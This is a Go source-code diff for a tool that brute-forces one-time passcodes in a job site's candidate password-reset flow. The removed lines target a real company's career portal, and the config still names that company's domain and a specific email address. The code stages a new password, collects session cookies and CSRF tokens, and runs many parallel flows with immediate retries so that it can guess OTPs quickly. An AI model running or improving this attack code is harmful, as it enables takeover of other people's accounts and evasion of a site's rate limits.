@@ -46,18 +46,24 @@ func createHTTPClient(proxyURL string) (*http.Client, error) {
         jar, _ := cookiejar.New(nil)
 
         transport := &http.Transport{
-                MaxIdleConns:        100,
-                MaxIdleConnsPerHost: 50,
+                MaxIdleConns:        0,                 // Unlimited for maximum speed
+                MaxIdleConnsPerHost: 0,                 // Unlimited per host
                 IdleConnTimeout:     90 * time.Second,
-                TLSHandshakeTimeout: 15 * time.Second,
+                TLSHandshakeTimeout: 30 * time.Second,  // Increased for proxy
                 DisableKeepAlives:   false,
+                DisableCompression:  true,              // Disable compression for speed
+                ForceAttemptHTTP2:   false,             // Disable HTTP/2 for proxy compatibility
+                MaxConnsPerHost:     0,                 // No limit
                 TLSClientConfig: &tls.Config{
                         InsecureSkipVerify: false,
                 },
                 DialContext: (&net.Dialer{
-                        Timeout:   10 * time.Second,
+                        Timeout:   30 * time.Second,    // Increased for proxy
                         KeepAlive: 30 * time.Second,
+                        DualStack: true,
                 }).DialContext,
+                ProxyConnectHeader: http.Header{},
+                ExpectContinueTimeout: 0,              // No delay
         }
 
         if proxyURL != "" {
@@ -70,7 +76,7 @@ func createHTTPClient(proxyURL string) (*http.Client, error) {
 
         client := &http.Client{
                 Jar:       jar,
-                Timeout:   45 * time.Second,
+                Timeout:   60 * time.Second,            // Increased for proxy stability
                 Transport: transport,
         }
 
@@ -118,159 +124,211 @@ func doRequestWithRetry(client *http.Client, req *http.Request, maxRetries int) 
         var err error
 
         for i := 0; i < maxRetries; i++ {
+                // Recreate request for each attempt to avoid connection reuse issues
                 var reqToSend *http.Request
                 if req.GetBody != nil {
                         body, _ := req.GetBody()
                         reqToSend, _ = http.NewRequest(req.Method, req.URL.String(), body)
                         reqToSend.Header = req.Header.Clone()
+                } else if req.Body != nil {
+                        // For requests with body, we need to read and recreate
+                        bodyBytes, _ := req.GetBody()
+                        reqToSend, _ = http.NewRequest(req.Method, req.URL.String(), bodyBytes)
+                        reqToSend.Header = req.Header.Clone()
                 } else {
-                        reqToSend = req
+                        reqToSend, _ = http.NewRequest(req.Method, req.URL.String(), nil)
+                        reqToSend.Header = req.Header.Clone()
                 }
 
                 resp, err = client.Do(reqToSend)
                 if err == nil {
+                        // Check for server errors and retry
+                        if resp.StatusCode == 502 || resp.StatusCode == 503 || resp.StatusCode == 504 {
+                                resp.Body.Close()
+                                if i < maxRetries-1 {
+                                        continue
+                                }
+                        }
                         return resp, nil
                 }
 
-                if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "TLS handshake") {
-                        if i < maxRetries-1 {
-                                backoff := time.Duration(i+1) * 500 * time.Millisecond
-                                time.Sleep(backoff)
-                                continue
-                        }
+                // Retry on ALL proxy/timeout/connection errors (no delay for speed)
+                errStr := err.Error()
+                isRetryable := strings.Contains(errStr, "timeout") || 
+                   strings.Contains(errStr, "TLS handshake") ||
+                   strings.Contains(errStr, "proxyconnect") ||
+                   strings.Contains(errStr, "dial tcp") ||
+                   strings.Contains(errStr, "i/o timeout") ||
+                   strings.Contains(errStr, "connection reset") ||
+                   strings.Contains(errStr, "connection refused") ||
+                   strings.Contains(errStr, "lookup") ||
+                   strings.Contains(errStr, "EOF") ||
+                   strings.Contains(errStr, "server gave HTTP response to HTTPS client") ||
+                   strings.Contains(errStr, "broken pipe")
+
+                if isRetryable && i < maxRetries-1 {
+                        continue // Retry immediately without delay
                 }
 
-                return nil, err
+                if !isRetryable {
+                        return nil, err
+                }
         }
 
         return nil, err
 }
 
 func executeFlow(config Config, flowNum int) {
-        client, err := createHTTPClient(config.ProxyURL)
-        if err != nil {
-                fmt.Printf("flow %d - Error creating client: %v\n", flowNum, err)
-                return
-        }
-
-        // Request 1: GET /candidate/login?
-        req1, _ := http.NewRequest("GET", "https://jobs.amdocs.com/candidate/login?", nil)
-        req1.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
-        req1.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
-        req1.Header.Set("Accept-Language", "en-US,en;q=0.5")
-        req1.Header.Set("Accept-Encoding", "gzip, deflate, br")
-        req1.Header.Set("Upgrade-Insecure-Requests", "1")
-        req1.Header.Set("Sec-Fetch-Dest", "document")
-        req1.Header.Set("Sec-Fetch-Mode", "navigate")
-        req1.Header.Set("Sec-Fetch-Site", "none")
-        req1.Header.Set("Sec-Fetch-User", "?1")
-        req1.Header.Set("Priority", "u=0, i")
-        req1.Header.Set("Te", "trailers")
-
-        resp1, err := doRequestWithRetry(client, req1, 3)
-        if err != nil {
-                fmt.Printf("flow %d - Error in GET /candidate/login?: %v\n", flowNum, err)
-                return
-        }
-        defer resp1.Body.Close()
-
-        cookie := ""
-        for _, c := range resp1.Cookies() {
-                if c.Name == "_vs" {
-                        cookie = fmt.Sprintf("%s=%s", c.Name, c.Value)
-                        break
+        // Retry entire flow up to 5 times if it fails
+        for flowRetry := 0; flowRetry < 5; flowRetry++ {
+                client, err := createHTTPClient(config.ProxyURL)
+                if err != nil {
+                        if flowRetry == 4 {
+                                return
+                        }
+                        continue
                 }
-        }
 
-        if cookie == "" {
-                fmt.Printf("flow %d - Error: Could not get cookie\n", flowNum)
-                return
-        }
+                // Request 1: GET /candidate/login?
+                req1, _ := http.NewRequest("GET", "https://localhost/candidate/login?", nil)
+                req1.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
+                req1.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+                req1.Header.Set("Accept-Language", "en-US,en;q=0.5")
+                req1.Header.Set("Accept-Encoding", "gzip, deflate, br")
+                req1.Header.Set("Upgrade-Insecure-Requests", "1")
+                req1.Header.Set("Sec-Fetch-Dest", "document")
+                req1.Header.Set("Sec-Fetch-Mode", "navigate")
+                req1.Header.Set("Sec-Fetch-Site", "none")
+                req1.Header.Set("Sec-Fetch-User", "?1")
+                req1.Header.Set("Priority", "u=0, i")
+                req1.Header.Set("Te", "trailers")
 
-        reqNum1 := getNextRequestNumber()
-        fmt.Printf("%d. flow %d - GET /candidate/login? [%d]\n", reqNum1, flowNum, resp1.StatusCode)
+                resp1, err := doRequestWithRetry(client, req1, 10) // Increased retries
+                if err != nil {
+                        if flowRetry < 4 {
+                                continue // Retry entire flow
+                        }
+                        return
+                }
+                resp1.Body.Close() // Close immediately
 
-        // Request 2: GET /api/career_signup/account_info
-        emailEncoded := url.QueryEscape(config.Email)
-        req2, _ := http.NewRequest("GET", fmt.Sprintf("https://jobs.amdocs.com/api/career_signup/account_info?domain=%s&email=%s", config.Domain, emailEncoded), nil)
-        req2.Header.Set("Cookie", cookie)
-        req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
-        req2.Header.Set("Accept", "*/*")
-        req2.Header.Set("Accept-Language", "en-US,en;q=0.5")
-        req2.Header.Set("Accept-Encoding", "gzip, deflate, br")
-        req2.Header.Set("Referer", "https://jobs.amdocs.com/candidate/login?")
-        req2.Header.Set("Content-Type", "application/json")
-        req2.Header.Set("X-Browser-Request-Time", fmt.Sprintf("%.3f", float64(time.Now().UnixNano())/1e9))
-        req2.Header.Set("Sec-Fetch-Dest", "empty")
-        req2.Header.Set("Sec-Fetch-Mode", "cors")
-        req2.Header.Set("Sec-Fetch-Site", "same-origin")
-        req2.Header.Set("Priority", "u=0")
-        req2.Header.Set("Cache-Control", "max-age=0")
-        req2.Header.Set("Te", "trailers")
+                cookie := ""
+                for _, c := range resp1.Cookies() {
+                        if c.Name == "_vs" {
+                                cookie = fmt.Sprintf("%s=%s", c.Name, c.Value)
+                                break
+                        }
+                }
 
-        resp2, err := doRequestWithRetry(client, req2, 3)
-        if err != nil {
-                fmt.Printf("flow %d - Error in GET /api/career_signup/account_info: %v\n", flowNum, err)
-                return
-        }
-        defer resp2.Body.Close()
+                if cookie == "" {
+                        if flowRetry < 4 {
+                                continue // Retry entire flow
+                        }
+                        return
+                }
 
-        csrfToken := resp2.Header.Get("X-Csrf-Token")
-        if csrfToken == "" {
-                fmt.Printf("flow %d - Error: Could not get CSRF token\n", flowNum)
-                return
-        }
+                reqNum1 := getNextRequestNumber()
+                fmt.Printf("%d. flow %d - GET /candidate/login? [%d]\n", reqNum1, flowNum, resp1.StatusCode)
 
-        reqNum2 := getNextRequestNumber()
-        fmt.Printf("%d. flow %d - GET /api/career_signup/account_info [%d]\n", reqNum2, flowNum, resp2.StatusCode)
+                // Request 2: GET /api/career_signup/account_info
+                emailEncoded := url.QueryEscape(config.Email)
+                req2, _ := http.NewRequest("GET", fmt.Sprintf("https://localhost/api/career_signup/account_info?domain=%s&email=%s", config.Domain, emailEncoded), nil)
+                req2.Header.Set("Cookie", cookie)
+                req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
+                req2.Header.Set("Accept", "*/*")
+                req2.Header.Set("Accept-Language", "en-US,en;q=0.5")
+                req2.Header.Set("Accept-Encoding", "gzip, deflate, br")
+                req2.Header.Set("Referer", "https://localhost/candidate/login?")
+                req2.Header.Set("Content-Type", "application/json")
+                req2.Header.Set("X-Browser-Request-Time", fmt.Sprintf("%.3f", float64(time.Now().UnixNano())/1e9))
+                req2.Header.Set("Sec-Fetch-Dest", "empty")
+                req2.Header.Set("Sec-Fetch-Mode", "cors")
+                req2.Header.Set("Sec-Fetch-Site", "same-origin")
+                req2.Header.Set("Priority", "u=0")
+                req2.Header.Set("Cache-Control", "max-age=0")
+                req2.Header.Set("Te", "trailers")
 
-        // Request 3: POST /api/career_signup/stage_password
-        body3 := map[string]interface{}{
-                "password":         config.Password,
-                "domain":           config.Domain,
-                "is_password_reset": true,
-                "email":            config.Email,
-        }
-        jsonBody3, _ := json.Marshal(body3)
+                resp2, err := doRequestWithRetry(client, req2, 10) // Increased retries
+                if err != nil {
+                        if flowRetry < 4 {
+                                continue // Retry entire flow
+                        }
+                        return
+                }
+                csrfToken := resp2.Header.Get("X-Csrf-Token")
+                resp2.Body.Close() // Close immediately
+                
+                if csrfToken == "" {
+                        if flowRetry < 4 {
+                                continue // Retry entire flow
+                        }
+                        return
+                }
 
-        req3, _ := http.NewRequest("POST", "https://jobs.amdocs.com/api/career_signup/stage_password", bytes.NewBuffer(jsonBody3))
-        req3.Header.Set("Cookie", cookie)
-        req3.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
-        req3.Header.Set("Accept", "application/json, text/plain, */*")
-        req3.Header.Set("Accept-Language", "en-US,en;q=0.5")
-        req3.Header.Set("Accept-Encoding", "gzip, deflate, br")
-        req3.Header.Set("Referer", "https://jobs.amdocs.com/candidate/login?")
-        req3.Header.Set("Content-Type", "application/json")
-        req3.Header.Set("X-Csrf-Token", csrfToken)
-        req3.Header.Set("X-Browser-Request-Time", fmt.Sprintf("%.3f", float64(time.Now().UnixNano())/1e9))
-        req3.Header.Set("Origin", "https://jobs.amdocs.com")
-        req3.Header.Set("Sec-Fetch-Dest", "empty")
-        req3.Header.Set("Sec-Fetch-Mode", "cors")
-        req3.Header.Set("Sec-Fetch-Site", "same-origin")
-        req3.Header.Set("Priority", "u=0")
-        req3.Header.Set("Te", "trailers")
+                reqNum2 := getNextRequestNumber()
+                fmt.Printf("%d. flow %d - GET /api/career_signup/account_info [%d]\n", reqNum2, flowNum, resp2.StatusCode)
 
-        resp3, err := doRequestWithRetry(client, req3, 3)
-        if err != nil {
-                fmt.Printf("flow %d - Error in POST /api/career_signup/stage_password: %v\n", flowNum, err)
-                return
-        }
-        defer resp3.Body.Close()
+                // Request 3: POST /api/career_signup/stage_password
+                body3 := map[string]interface{}{
+                        "password":         config.Password,
+                        "domain":           config.Domain,
+                        "is_password_reset": true,
+                        "email":            config.Email,
+                }
+                jsonBody3, _ := json.Marshal(body3)
 
-        reqNum3 := getNextRequestNumber()
-        fmt.Printf("%d. flow %d - POST /api/career_signup/stage_password [%d]\n", reqNum3, flowNum, resp3.StatusCode)
+                req3, _ := http.NewRequest("POST", "https://localhost/api/career_signup/stage_password", bytes.NewBuffer(jsonBody3))
+                req3.Header.Set("Cookie", cookie)
+                req3.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
+                req3.Header.Set("Accept", "application/json, text/plain, */*")
+                req3.Header.Set("Accept-Language", "en-US,en;q=0.5")
+                req3.Header.Set("Accept-Encoding", "gzip, deflate, br")
+                req3.Header.Set("Referer", "https://localhost/candidate/login?")
+                req3.Header.Set("Content-Type", "application/json")
+                req3.Header.Set("X-Csrf-Token", csrfToken)
+                req3.Header.Set("X-Browser-Request-Time", fmt.Sprintf("%.3f", float64(time.Now().UnixNano())/1e9))
+                req3.Header.Set("Origin", "https://localhost")
+                req3.Header.Set("Sec-Fetch-Dest", "empty")
+                req3.Header.Set("Sec-Fetch-Mode", "cors")
+                req3.Header.Set("Sec-Fetch-Site", "same-origin")
+                req3.Header.Set("Priority", "u=0")
+                req3.Header.Set("Te", "trailers")
 
-        // Save session
-        sessionsMutex.Lock()
-        sessions = append(sessions, Session{
-                Cookie:    cookie,
-                CSRFToken: csrfToken,
-        })
-        sessionsMutex.Unlock()
+                resp3, err := doRequestWithRetry(client, req3, 10) // Increased retries
+                if err != nil {
+                        if flowRetry < 4 {
+                                continue // Retry entire flow
+                        }
+                        return
+                }
+                
+                statusCode := resp3.StatusCode
+                resp3.Body.Close() // Close immediately
+                
+                if statusCode != 200 {
+                        if flowRetry < 4 {
+                                continue // Retry entire flow
+                        }
+                        return
+                }
 
-        // Send send_otp_verification in first flow if SendOTPEarly is true
-        if config.SendOTPEarly && flowNum == 1 {
-                sendOTPVerification(config, cookie, csrfToken)
+                reqNum3 := getNextRequestNumber()
+                fmt.Printf("%d. flow %d - POST /api/career_signup/stage_password [%d]\n", reqNum3, flowNum, statusCode)
+
+                // Save session
+                sessionsMutex.Lock()
+                sessions = append(sessions, Session{
+                        Cookie:    cookie,
+                        CSRFToken: csrfToken,
+                })
+                sessionsMutex.Unlock()
+
+                // Send send_otp_verification in first flow if SendOTPEarly is true
+                if config.SendOTPEarly && flowNum == 1 {
+                        sendOTPVerification(config, cookie, csrfToken)
+                }
+                
+                return // Success - exit retry loop
         }
 }
 
@@ -304,7 +362,7 @@ func sendOTPVerification(config Config, cookie string, csrfToken string) {
         }
         jsonBody, _ := json.Marshal(body)
 
-        req, err := http.NewRequest("POST", "https://jobs.amdocs.com/api/career_signup/send_otp_verification", bytes.NewBuffer(jsonBody))
+        req, err := http.NewRequest("POST", "https://localhost/api/career_signup/send_otp_verification", bytes.NewBuffer(jsonBody))
         if err != nil {
                 fmt.Printf("%d. Error creating request: %v\n", reqNum, err)
                 atomic.StoreInt32(&sendOTPSent, 0)
@@ -316,11 +374,11 @@ func sendOTPVerification(config Config, cookie string, csrfToken string) {
         req.Header.Set("Accept", "application/json, text/plain, */*")
         req.Header.Set("Accept-Language", "en-US,en;q=0.5")
         req.Header.Set("Accept-Encoding", "gzip, deflate, br")
-        req.Header.Set("Referer", "https://jobs.amdocs.com/candidate/login?")
+        req.Header.Set("Referer", "https://localhost/candidate/login?")
         req.Header.Set("Content-Type", "application/json")
         req.Header.Set("X-Csrf-Token", csrfToken)
         req.Header.Set("X-Browser-Request-Time", fmt.Sprintf("%.3f", float64(time.Now().UnixNano())/1e9))
-        req.Header.Set("Origin", "https://jobs.amdocs.com")
+        req.Header.Set("Origin", "https://localhost")
         req.Header.Set("Sec-Fetch-Dest", "empty")
         req.Header.Set("Sec-Fetch-Mode", "cors")
         req.Header.Set("Sec-Fetch-Site", "same-origin")
@@ -393,17 +451,17 @@ func bruteForceOTP(config Config, otpFile string) {
                                 }
                                 jsonBody, _ := json.Marshal(body)
 
-                                req, _ := http.NewRequest("POST", "https://jobs.amdocs.com/api/career_signup/confirm_otp", bytes.NewBuffer(jsonBody))
+                                req, _ := http.NewRequest("POST", "https://localhost/api/career_signup/confirm_otp", bytes.NewBuffer(jsonBody))
                                 req.Header.Set("Cookie", s.Cookie)
                                 req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
                                 req.Header.Set("Accept", "application/json, text/plain, */*")
                                 req.Header.Set("Accept-Language", "en-US,en;q=0.5")
                                 req.Header.Set("Accept-Encoding", "gzip, deflate, br")
-                                req.Header.Set("Referer", "https://jobs.amdocs.com/candidate/login?")
+                                req.Header.Set("Referer", "https://localhost/candidate/login?")
                                 req.Header.Set("Content-Type", "application/json")
                                 req.Header.Set("X-Csrf-Token", s.CSRFToken)
                                 req.Header.Set("X-Browser-Request-Time", fmt.Sprintf("%.3f", float64(time.Now().UnixNano())/1e9))
-                                req.Header.Set("Origin", "https://jobs.amdocs.com")
+                                req.Header.Set("Origin", "https://localhost")
                                 req.Header.Set("Sec-Fetch-Dest", "empty")
                                 req.Header.Set("Sec-Fetch-Mode", "cors")
                                 req.Header.Set("Sec-Fetch-Site", "same-origin")
@@ -430,7 +488,7 @@ func main() {
         config := Config{
                 Email:    "dashun.cavin@dropmeon.com",
                 Domain:   "amdocs.com",
-                Password: "NEWpOSS123@22",
+                Password: "NEWpOSS123@005",
                 ProxyURL: "",
         }
 
@@ -490,11 +548,11 @@ func main() {
 
         for i := 1; i <= config.NumFlows; i++ {
                 wg.Add(1)
-                semaphore <- struct{}{} // Acquire semaphore
-
+                
                 go func(flowNum int) {
-                        defer wg.Done()
+                        semaphore <- struct{}{} // Acquire semaphore
                         defer func() { <-semaphore }() // Release semaphore
+                        defer wg.Done()
                         executeFlow(config, flowNum)
                 }(i)
         }
